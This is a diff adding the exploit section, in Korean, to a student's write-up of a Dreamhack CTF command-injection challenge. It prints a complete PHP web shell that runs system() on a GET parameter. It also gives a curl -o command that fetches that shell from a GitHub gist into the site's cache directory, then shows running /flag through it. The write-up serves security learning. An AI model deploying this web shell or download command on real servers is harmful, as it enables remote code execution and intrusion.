@@ -75,3 +75,39 @@
 <br/><br/>
 
 ## 익스플로잇
+1. 옵션을 조작하여 Command Injection을 수행하여 ```cache``` 디렉터리에 파일을 생성한 후 파일 내용에 명령어를 실행하는 코드를 삽입해 웹 셸 파일을 업로드해야 함
+    - curl의 ```-o``` 옵션은 명령어의 실행 결과(방문한 url의 소스코드)를 <file>이란 이름의 파일에 저장함 → 웹 셸 코드가 포함된 웹 페이지의 주소를 명령어의 인자로 전달해 이를 방문하여 해당 내용을 <file> 파일에 저장해야 함
+    - 웹 셸 업로드 방법
+        1. 개인의 웹 서버에 웹 셸 코드를 올리고 해당 페이지를 방문하는 방법
+        2. Github Raw File 링크를 이용하는 방법
+            - 드림핵 강의에서 제공하는 [링크](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php)에 접속해보면 웹 셸 코드를 반환하는 것을 알 수 있음
+                ```php
+                <html>
+                    <body>
+                        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+                            <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+                            <input type="SUBMIT" value="Execute">
+                        </form>
+                        <pre>
+                            <?php
+                                if(isset($_GET['cmd']))
+                                {
+                                    system($_GET['cmd']); // system 함수로 <input> 태그에서 입력 받은 명령(cmd)를 실행하고 있음
+                                }
+                            ?>
+                        </pre>
+                    </body>
+                </html>
+                ```
+            - 위의 링크를 이용해 사이트에서 ```https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o /var/www/html/cache/webshell.php```를 입력해 웹 셸을 업로드함
+                <img width="984" alt="익스플로잇 1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/2643a4f5-0c84-4213-9c51-e214b82bd183">
+                <img width="984" alt="익스플로잇 1(결과)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/ce06ca6e-bc9f-4796-b142-19fde5a23fe3">
+
+2. 웹 셸(websehll.php)를 업로드한 후 해당 페이지(```http://host3.dreamhack.games:20849/cache/webshell.php```)에 접속하면 명령어를 실행할 수 있는 페이지가 출력되는 것을 볼 수 있음
+    <img width="984" alt="익스플로잇 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/60c5a1d7-8062-4244-abf7-b6a29dc6f069">
+
+3. ```/flag``` 바이너리에 실행 권한만 있다고 명시되어 있으므로 ```/flag```를 입력하여 해당 파일을 실행해 플래그를 획득함
+    <img width="984" alt="익스플로잇 3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/3ba3f4eb-a76d-49df-a4e7-33ba00e324df">
+    <img width="984" alt="익스플로잇 3(결과)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b3058e93-ce16-4f0e-ad70-587e2a758cba">
+    - ```ls -al /``` 명령어를 입력해 실행 권한을 살펴보면 ```/flag```의 권한이 ```---x--x--x```로 되어 있어 실행(x)만 가능하다는 것을 알 수 있음
+       <img width="984" alt="flag 실행 권한 확인" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/032b0aaa-383f-44c9-b3e8-a491d1ed3aef">
